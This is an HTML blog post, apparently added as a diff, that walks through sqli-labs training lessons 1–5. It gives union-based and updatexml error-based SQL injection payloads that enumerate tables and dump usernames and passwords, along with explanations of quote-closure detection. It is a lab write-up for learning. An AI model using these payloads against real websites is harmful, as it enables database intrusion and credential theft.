@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zh1yu.fun","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="感觉sql注入学习的还是不太好，特来sqli-labs补一补">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs靶场less-1-10">
+<meta property="og:url" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/index.html">
+<meta property="og:site_name" content="知鱼的Blog">
+<meta property="og:description" content="感觉sql注入学习的还是不太好，特来sqli-labs补一补">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/1.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/2.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/3.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/4.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/5.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/6.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/7.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/8.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/9.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/10.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/11.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/12.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/13.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/14.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/15.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/16.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/17.png">
+<meta property="og:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/18.png">
+<meta property="article:published_time" content="2025-06-20T15:19:02.000Z">
+<meta property="article:modified_time" content="2025-07-07T09:09:02.774Z">
+<meta property="article:author" content="zh1yu">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/1.png">
+
+<link rel="canonical" href="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli-labs靶场less-1-10 | 知鱼的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">知鱼的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zh1yu.fun/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zh1yu2.jpg">
+      <meta itemprop="name" content="zh1yu">
+      <meta itemprop="description" content="花有重开日,人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="知鱼的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-labs靶场less-1-10
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-20 23:19:02" itemprop="dateCreated datePublished" datetime="2025-06-20T23:19:02+08:00">2025-06-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-07 17:09:02" itemprop="dateModified" datetime="2025-07-07T17:09:02+08:00">2025-07-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 感觉sql注入学习的还是不太好，特来sqli-labs补一补</p>
+<span id="more"></span>、
+
+注：注入使用的注释符更推荐`-- -`，而非本文使用的`--+`
+
+## less-1
+
+**字符型`'`注入**
+
+判断注入类型：
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">#两个都正常回显，字符型注入</span><br></pre></td></tr></table></figure>
+<p>判断字符类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt="图片"></p>
+<p>1和2是一对的，3和4是一对的，5是我们写的，5右边的字符4就是实际的闭合方式</p>
+<p>注入过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id<span class="operator">=</span>$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><strong>数字型注入</strong></p>
+<p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #正常回显</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #不回显</span><br></pre></td></tr></table></figure>
+<p>注入过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version(),database()</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id<span class="operator">=</span>$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="区分字符型or数字型"><a href="#区分字符型or数字型" class="headerlink" title="区分字符型or数字型"></a>区分字符型or数字型</h2><p>假设字符型注入的类型是<strong>单引号</strong></p>
+<p>如果输入：<code>?id=1&#39; --+</code>不报错，正常回显，一般是字符型；如果输入：<code>?id=1&#39; --+</code>报错，那就有可能是数字型，且输入<code>?id=1 --+</code>不报错，那就是数字型</p>
+<p>如果字符型注入的类型<strong>不止是单引号</strong></p>
+<p>如果输入：<code>?id=1&#39; --+</code>报错，可能是字符型（除单引号的其他字符）或者数字型；输入<code>?id=1 --+</code>报错，那就肯定不是数字型</p>
+<p>好吧，在我测试完less-3后，发现上面的区分方法纯属扯淡，好像完全不对，因为数据库处理的过程并非是我想的那样😂</p>
+<h3 id="如何判断字符还是数字型注入："><a href="#如何判断字符还是数字型注入：" class="headerlink" title="如何判断字符还是数字型注入："></a>如何判断字符还是数字型注入：</h3><ol>
+<li>用减法判断：利用id=2-1 如果返回的是id=1的结果，则是数字注入，否则是字符注入</li>
+<li>用 and 1=1 和 and 1=2 来判断，两者都能正常回显则是字符型注入，否则是数字型注入</li>
+</ol>
+<p>解释第一种方法：如果是字符型那么它不会进行2-1这个运算，它只会输出id=2的结果，如果是数字型，那么它会计算出结果，回显出id=1</p>
+<p>第二种方法：如果是单引号字符型：比如id=1 and 1=1它也是只会计算id=1的值，后面and 1=1和and 1=2它只会当作字符串，所以只要是字符型它都能正常回显1的结果；而数字型不一样，1=1是正确的，他就会输出id=1的值，但是1=2不正确，它就不会输出id=1的结果</p>
+<h3 id="如何判断哪种字符型注入："><a href="#如何判断哪种字符型注入：" class="headerlink" title="如何判断哪种字符型注入："></a>如何判断哪种字符型注入：</h3><p>一般常见闭合方式都是<code>&#39;</code>和<code>&quot;</code>或者和<code>其他字符混合出现</code>，一般使用<code>id=1&#39;</code>和<code>id=1&quot;</code>根据报错的结果判断是哪种字符型</p>
+<p>解释：比如说是字符<code>&#39;</code>闭合，如果使用<code>id=1&#39;</code>，结果是两种都会报错，但是如果使用<code>id=1&quot;</code>，并不会报错，即使使用<code>id=1&quot; --+</code>这个也不会报错，因为它的select语句是<code>id=&#39;  1&quot; --+   &#39;</code>，它会把<code>1&quot; --+</code>当成字符串，—+注释符也不会起作用</p>
+<p>同理如果是字符<code>&quot;</code>闭合，如果使用<code>id=1&#39;</code>，结果是两种都不会报错，即使使用<code>id=1&#39; --+</code>这个也不会报错，道理同上；但是如果使用<code>id=1&quot;</code>，却会报错，因为闭合方式包含了<code>&quot;</code>字符，而检测到”后却没有检测到</p>
+<p>但如果说是字符<code>&#39;)</code>闭合，使用<code>id=1&#39;</code>会报错，使用<code>id=1&#39;--+</code>也会报错，因为<strong>检测到1后的单引号检测不到右括号</strong>，但是使用<code>id=1&quot;</code>或者<code>id=1&quot; --+</code>或者<code>id=1)</code>或者<code>id=1) --+</code>这四种都不会报错，<strong>因为检测不到单引号，只会把他们当成普通字符串</strong></p>
+<p>闭合方式是字符<code>&quot;)</code>同理</p>
+<p><strong>总结</strong>：如果是混合字符<code>x</code>闭合，只有当<code>id=1x</code>报错，但<code>id=1x --+</code>不报错，才能证明闭合方式是x</p>
+<h3 id="—-什么时候起作用："><a href="#—-什么时候起作用：" class="headerlink" title="—+什么时候起作用："></a>—+什么时候起作用：</h3><p>—+当我们找到正确的闭合方式后，—+才会起作用，如果你的闭合字符<code>&#39;</code>不属于查找语句的闭合字符<code>&quot;)</code>（里面的任何一种字符都不属于），那么—+根本不会起作用（以<code>)</code>闭合也不起作用，因为先检测双引号），但可以正常查询出结果；但是如果你的闭合字符<code>&quot;</code>是闭合字符<code>&quot;)</code>中最左边的字符，比如注入<code>id=1&quot; --+</code>这种就会报错；只有你的闭合字符与查找语句的闭合字符完全一致时，—+才起作用</p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p><strong>字符型<code>&#39;)</code>‘注入</strong></p>
+<p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">#都正常回显，字符型注入</span><br></pre></td></tr></table></figure>
+<p>判断字符类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="图片"></p>
+<p>注入过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) --+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,version(),database() --+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;) --+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>字符型<code>&quot;)</code>注入</p>
+<p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">#都正常回显</span><br></pre></td></tr></table></figure>
+<p>判断字符类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; #正常回显</span></span><br><span class="line"><span class="string">?id=1&quot; #报错</span></span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="图片"></p>
+<p>注入过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) --+</span><br><span class="line">?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,version(),database() --+</span><br><span class="line">?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;) --+</span><br><span class="line">?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><h2 id="报错注入（单引号）"><a href="#报错注入（单引号）" class="headerlink" title="报错注入（单引号）"></a><strong>报错注入（单引号）</strong></h2><p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p><img src="4.png" alt="图片"></p>
+<p>可以看到回显了，但没完全回显，因为数据不太对，这种属于报错注入，虽然是报错注入，但两种都能回显依旧证明是字符型</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="图片"></p>
+<p>可以判断是<code>&#39;</code>注入，如果正常回显，可以使用<code>&quot;</code>尝试</p>
+<p>mysql常用报错注入函数：</p>
+<h3 id="extractvalue-，updatexml-，floor-rand-group-by，exp"><a href="#extractvalue-，updatexml-，floor-rand-group-by，exp" class="headerlink" title="extractvalue()，updatexml()，floor() + rand() + group by，exp()"></a><strong>extractvalue()</strong>，<strong>updatexml()</strong>，<strong>floor() + rand() + group by</strong>，<strong>exp()</strong></h3><h2 id="union和and"><a href="#union和and" class="headerlink" title="union和and"></a>union和and</h2><p>使用uion联合注入时，通常一般令<code>id=-1</code>，使其不查询，而and通常是让后面的命令执行，所以前面的id必须是可以查到的id，常令<code>id=1</code></p>
+<p>报错注入用不了union联合查询，是用and进行拼接，从而执行updatexml函数，然后使用<code>updatexml</code>函数触发报错，把我们想要得到的内容通过报错触发</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,version()),3) --+   </span></span><br></pre></td></tr></table></figure>
+<p><code>0x7e</code> 等价于 <code>~</code>，<code>1</code> - 第一个参数，表示XML文档，<code>3</code> - 表示XPath表达式，第一个参数和第三个参数都可以随便填，只要能触发报错</p>
+<p>updatexml使用 XPath 表达式解析 XML，如果 XPath 语法错误，会返回错误信息（可用于数据泄露）。</p>
+<h2 id="concat和group-concat区别："><a href="#concat和group-concat区别：" class="headerlink" title="concat和group_concat区别："></a>concat和group_concat区别：</h2><p><code>CONCAT</code>（普通字符串拼接）：将 <strong>多个字符串</strong> 合并成一个字符串</p>
+<p><code>GROUP_CONCAT</code>（分组拼接）：将 <strong>多行数据</strong> 的某个字段值合并成一个字符串</p>
+<p>注入过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database()),3) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">3</span>)<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)),3)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users)),<span class="number">1</span>)<span class="comment">--+   </span></span><br><span class="line">#显示查找返回的数据超过一行，updatexml() 的报错信息最多只能返回 <span class="number">32</span> 位字符</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1)),3)--+</span></span><br><span class="line"><span class="string">#使用limit限制返回的行数</span></span><br></pre></td></tr></table></figure>
+<h2 id="limit-offset-count-的含义："><a href="#limit-offset-count-的含义：" class="headerlink" title="limit offset,count 的含义："></a>limit offset,count 的含义：</h2><p>比如limit 0,1 表示从第一行开始，查找一行返回结果；比如limit 0,2 表示从第一行开始，查找二行返回结果；limit 0,3 表示从第一行开始，查找三行返回结果；</p>
+<p>比如limit 1,1 表示从第二行开始，查找一行返回结果；比如limit 1,2 表示从第二行开始，查找二行返回结果；limit 1,3 表示从第二行开始，查找三行返回结果；</p>
+<p>源码：</p>
